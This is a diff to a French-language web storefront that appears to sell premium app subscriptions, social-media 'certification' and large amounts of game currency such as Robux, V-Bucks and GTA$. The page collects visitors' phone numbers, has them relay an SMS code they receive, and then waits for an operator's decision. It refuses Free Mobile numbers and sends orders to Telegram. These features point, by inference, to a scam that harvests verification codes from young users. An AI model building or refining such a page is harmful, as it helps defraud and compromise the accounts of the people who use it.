@@ -200,6 +200,23 @@
 
   .msg{font-size:13px; padding:11px 13px; border-radius:12px; text-align:center}
   .msg.err{background:color-mix(in srgb,var(--bad) 16%,var(--surface)); border:1px solid color-mix(in srgb,var(--bad) 30%,transparent); color:var(--fg)}
+
+  .warn{display:flex; align-items:center; gap:9px; font-size:12.5px; line-height:1.35; color:var(--fg);
+    background:color-mix(in srgb,#F59E0B 15%,var(--surface)); border:1px solid color-mix(in srgb,#F59E0B 38%,transparent);
+    border-radius:12px; padding:10px 12px}
+  .warn svg{width:16px; height:16px; stroke:#F59E0B; flex:0 0 auto}
+  .warn b{font-weight:700}
+
+  .how{display:grid; grid-template-columns:repeat(3,1fr); gap:8px; margin:0 0 22px}
+  .step{background:var(--surface-3); border:1px solid var(--line); border-radius:14px; padding:13px 8px 12px; text-align:center; display:flex; flex-direction:column; align-items:center; gap:7px}
+  .step .n{width:26px; height:26px; border-radius:50%; display:grid; place-items:center; font-family:var(--display); font-weight:800; font-size:13px; color:var(--accent-fg); background:linear-gradient(140deg,var(--accent),var(--accent-2)); box-shadow:0 5px 12px -5px color-mix(in srgb,var(--accent) 80%,transparent)}
+  .step span{font-size:11.5px; font-weight:600; color:var(--muted); line-height:1.25}
+
+  .reassure{display:flex; align-items:center; justify-content:center; gap:7px; font-size:12px; color:var(--muted); margin:2px 0 0}
+  .reassure svg{width:14px; height:14px; stroke:var(--good); flex:0 0 auto}
+
+  .foot{margin:20px 2px 0; padding-top:14px; border-top:1px solid var(--line); text-align:center; font-size:12px; color:var(--faint)}
+  .foot b{color:var(--muted); font-weight:700; user-select:all}
 </style>
 </head>
 <body>
@@ -224,6 +241,11 @@
           <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Validé avant paiement</span>
           <span class="chip"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"/></svg>Support réactif</span>
         </div>
+        <div class="how">
+          <div class="step"><span class="n">1</span><span>Choisis ton service</span></div>
+          <div class="step"><span class="n">2</span><span>Reçois ton code</span></div>
+          <div class="step"><span class="n">3</span><span>Profite direct</span></div>
+        </div>
         <div class="services" id="liste-services"></div>
       </div>
 
@@ -242,6 +264,7 @@
             <label for="telephone">Numéro de téléphone</label>
             <input type="tel" id="telephone" name="telephone" placeholder="Ex : 06 12 34 56 78" autocomplete="tel" inputmode="tel" pattern="[0-9+().\s-]{6,}" required>
             <span class="hint">On s'en sert uniquement pour t'envoyer le code.</span>
+            <div class="warn"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.3 3.9 1.8 18a2 2 0 0 0 1.7 3h17a2 2 0 0 0 1.7-3L13.7 3.9a2 2 0 0 0-3.4 0z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg><span><b>Numéros Free Mobile non acceptés.</b> Utilise un autre opérateur pour recevoir ton code.</span></div>
           </div>
 
           <fieldset>
@@ -251,6 +274,7 @@
 
           <div id="err-form" class="msg err" hidden></div>
           <button type="submit" class="submit" id="btn-envoyer">Je m'inscris</button>
+          <p class="reassure"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6 9 17l-5-5"/></svg>Ton accès est activé dès que ton code est validé.</p>
           <button type="button" class="link-btn" id="lien-code">J'ai déjà un code d'accès</button>
           <button type="button" class="link-btn" id="lien-services">← Changer de service</button>
           <p class="privacy"><svg viewBox="0 0 24 24" fill="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Aucune donnée partagée avec des tiers.</p>
@@ -300,107 +324,92 @@
         <p id="ko-texte">Ce code n'a pas été validé. Vérifie auprès de nous et réessaie.</p>
         <button type="button" id="ko-retour">Réessayer</button>
       </div>
+
+      <div id="vue-ferme" class="result" hidden>
+        <div class="mark" style="background:color-mix(in srgb,var(--accent) 18%,var(--surface-3))"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="stroke:var(--accent)"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 2"/></svg></div>
+        <h2>Boutique fermée. Reviens bientôt&nbsp;!</h2>
+        <p>On revient très vite&nbsp;! Repasse dans un petit moment pour commander.</p>
+        <button type="button" id="ferme-retry">Réessayer</button>
+      </div>
+
+      <div class="foot" id="foot" hidden>Une question&nbsp;? Écris-nous : <b id="foot-contact"></b></div>
     </div>
   </main>
 
   <script>
     /* ====================================================================
        ⚙️  TES SERVICES — c'est ICI que tu ajoutes / modifies tout.
-         id        : identifiant court et unique (sans espace)
-         cat       : le rayon ("Réseaux sociaux", "Musique", "Jeux")
-         nom       : nom affiché (ex. "SNAP+")
-         sigle     : 1 à 3 lettres pour le petit logo
-         tag       : sous-titre court
-         couleurs  : [couleur1, couleur2] du dégradé (codes hex)
-         formules  : liste des abonnements (value = ce qui part sur Telegram)
+         id/cat/nom/sigle/tag/couleurs/formules (voir exemples ci-dessous)
     ==================================================================== */
+    // 📩 Ton contact affiché en bas (pseudo Telegram, Insta, Snap…). Laisse "" pour masquer.
+    const CONTACT = "@spawww_ldr";
+
     const CATEGORIES = ["Réseaux sociaux", "Musique", "Jeux"];
 
     const SERVICES = [
-      // ---- Réseaux sociaux ----
-      {
-        id: "snap", cat: "Réseaux sociaux", nom: "SNAP+", sigle: "S+", tag: "Premium Snapchat",
+      { id: "snap", cat: "Réseaux sociaux", nom: "SNAP+", sigle: "S+", tag: "Premium Snapchat",
         couleurs: ["#FFC400", "#FF8A1B"],
         formules: [
           { value: "3 mois", nom: "3 mois", desc: "Pour essayer" },
           { value: "6 mois", nom: "6 mois", desc: "Le choix malin", badge: "Populaire" },
           { value: "1 an",   nom: "1 an",   desc: "Meilleure valeur" },
-        ],
-      },
-      {
-        id: "certif-snap", cat: "Réseaux sociaux", nom: "Certif Snap", sigle: "CS", tag: "Certification Snapchat",
+        ] },
+      { id: "certif-snap", cat: "Réseaux sociaux", nom: "Certif Snap", sigle: "CS", tag: "Certification Snapchat",
         couleurs: ["#5B8DEF", "#3B5BF0"],
         formules: [
           { value: "3 mois",  nom: "3 mois",  desc: "Pour essayer" },
           { value: "5 mois",  nom: "5 mois",  desc: "Le choix malin", badge: "Populaire" },
           { value: "10 mois", nom: "10 mois", desc: "Meilleure valeur" },
-        ],
-      },
-      {
-        id: "certif-insta", cat: "Réseaux sociaux", nom: "Certif Insta", sigle: "CI", tag: "Certification Instagram",
+        ] },
+      { id: "certif-insta", cat: "Réseaux sociaux", nom: "Certif Insta", sigle: "CI", tag: "Certification Instagram",
         couleurs: ["#E95BD8", "#F4476B"],
         formules: [
           { value: "3 mois", nom: "3 mois", desc: "Pour essayer" },
           { value: "6 mois", nom: "6 mois", desc: "Le choix malin", badge: "Populaire" },
           { value: "1 an",   nom: "1 an",   desc: "Meilleure valeur" },
-        ],
-      },
-      // ---- Musique ----
-      {
-        id: "spotify", cat: "Musique", nom: "Spotify", sigle: "SP", tag: "Premium Musique",
+        ] },
+      { id: "spotify", cat: "Musique", nom: "Spotify", sigle: "SP", tag: "Premium Musique",
         couleurs: ["#1ED760", "#12A24A"],
         formules: [
           { value: "3 mois", nom: "3 mois", desc: "Pour essayer" },
           { value: "6 mois", nom: "6 mois", desc: "Le choix malin", badge: "Populaire" },
           { value: "1 an",   nom: "1 an",   desc: "Meilleure valeur" },
-        ],
-      },
-      {
-        id: "deezer", cat: "Musique", nom: "Deezer", sigle: "DZ", tag: "Premium Musique",
+        ] },
+      { id: "deezer", cat: "Musique", nom: "Deezer", sigle: "DZ", tag: "Premium Musique",
         couleurs: ["#B373FF", "#7A4DF5"],
         formules: [
           { value: "3 mois", nom: "3 mois", desc: "Pour essayer" },
           { value: "6 mois", nom: "6 mois", desc: "Le choix malin", badge: "Populaire" },
           { value: "1 an",   nom: "1 an",   desc: "Meilleure valeur" },
-        ],
-      },
-      // ---- Jeux ----
-      {
-        id: "robux", cat: "Jeux", nom: "Robux", sigle: "R$", tag: "Crédits Roblox",
+        ] },
+      { id: "robux", cat: "Jeux", nom: "Robux", sigle: "R$", tag: "Crédits Roblox",
         couleurs: ["#FFB020", "#F0730C"],
         formules: [
           { value: "2500 Robux",  nom: "2 500 Robux" },
           { value: "5000 Robux",  nom: "5 000 Robux", badge: "Populaire" },
           { value: "10000 Robux", nom: "10 000 Robux", desc: "Meilleure valeur" },
-        ],
-      },
-      {
-        id: "vbucks", cat: "Jeux", nom: "V-Bucks Fortnite", sigle: "VB", tag: "V-Bucks Fortnite",
+        ] },
+      { id: "vbucks", cat: "Jeux", nom: "V-Bucks Fortnite", sigle: "VB", tag: "V-Bucks Fortnite",
         couleurs: ["#6D8BFF", "#4F46E5"],
         formules: [
           { value: "2500 V-Bucks",  nom: "2 500 V-Bucks" },
           { value: "5600 V-Bucks",  nom: "5 600 V-Bucks", badge: "Populaire" },
           { value: "12500 V-Bucks", nom: "12 500 V-Bucks", desc: "Meilleure valeur" },
-        ],
-      },
-      {
-        id: "gta", cat: "Jeux", nom: "GTA$", sigle: "G$", tag: "Argent GTA Online",
+        ] },
+      { id: "gta", cat: "Jeux", nom: "GTA$", sigle: "G$", tag: "Argent GTA Online",
         couleurs: ["#4ADE80", "#16A34A"],
         formules: [
           { value: "10M GTA$",  nom: "10 M GTA$" },
           { value: "50M GTA$",  nom: "50 M GTA$", badge: "Populaire" },
           { value: "100M GTA$", nom: "100 M GTA$", desc: "Meilleure valeur" },
-        ],
-      },
-      {
-        id: "gemmes-cr", cat: "Jeux", nom: "Gemmes Clash Royale", sigle: "CR", tag: "Gemmes Clash Royale",
+        ] },
+      { id: "gemmes-cr", cat: "Jeux", nom: "Gemmes Clash Royale", sigle: "CR", tag: "Gemmes Clash Royale",
         couleurs: ["#38E0F0", "#2C8BF0"],
         formules: [
           { value: "1000 gemmes", nom: "1 000 gemmes" },
           { value: "2500 gemmes", nom: "2 500 gemmes", badge: "Populaire" },
           { value: "5000 gemmes", nom: "5 000 gemmes", desc: "Meilleure valeur" },
-        ],
-      },
+        ] },
     ];
     /* ==================================================================== */
 
@@ -411,6 +420,7 @@
       attente: document.getElementById("vue-attente"),
       ok: document.getElementById("vue-ok"),
       ko: document.getElementById("vue-ko"),
+      ferme: document.getElementById("vue-ferme"),
     };
     const montrer = (nom) => { for(const k in vues) vues[k].hidden = (k !== nom); };
     const erreur = (el, txt) => { el.textContent = txt; el.hidden = false; };
@@ -496,6 +506,7 @@
       try{
         const res = await fetch("/submit", { method:"POST", body:new FormData(form) });
         const data = await res.json();
+        if(data.ferme){ montrer("ferme"); return; }
         if(data.ok){
           document.getElementById("code-prenom").value = prenom;
           document.getElementById("code-tel").value = tel;
@@ -519,6 +530,21 @@
     document.getElementById("lien-services").addEventListener("click", () => montrer("services"));
     document.getElementById("lien-retour").addEventListener("click", () => { errCode.hidden = true; montrer("form"); });
     document.getElementById("ko-retour").addEventListener("click", () => { montrer("code"); });
+    document.getElementById("ferme-retry").addEventListener("click", () => verifierEtat());
+
+    if(CONTACT && CONTACT.trim()){
+      document.getElementById("foot-contact").textContent = CONTACT.trim();
+      document.getElementById("foot").hidden = false;
+    }
+
+    async function verifierEtat(){
+      try{
+        const res = await fetch("/etat");
+        const data = await res.json();
+        if(data.ouvert === false){ montrer("ferme"); } else { montrer("services"); }
+      }catch(err){ montrer("services"); }
+    }
+    verifierEtat();
 
     formCode.addEventListener("submit", async (e) => {
       e.preventDefault();
@@ -532,6 +558,7 @@
       try{
         const res = await fetch("/verifier", { method:"POST", body:new FormData(formCode) });
         const data = await res.json();
+        if(data.ferme){ montrer("ferme"); return; }
         if(data.ok && data.id){ attendreDecision(data.id); }
         else { erreur(errCode, "Une erreur est survenue, réessaie."); }
       }catch(err){
